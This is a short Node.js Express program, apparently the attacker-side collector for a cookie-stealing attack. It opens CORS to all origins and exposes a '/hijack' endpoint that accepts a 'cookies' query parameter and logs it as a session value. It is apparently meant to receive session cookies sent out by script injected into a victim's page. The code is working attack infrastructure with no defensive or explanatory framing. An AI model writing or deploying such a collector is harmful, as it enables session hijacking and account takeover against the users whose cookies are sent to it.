const app = require('express')();
const cors = require('cors');

app.use(cors());
app.get('/hijack', (req, res) => {
  const cookies = req.query.cookies;
  console.log('Session:', cookies);
  res.status(200).send();
});

app.listen(3001, () => console.log('Listen on port http://localhost:3001'));
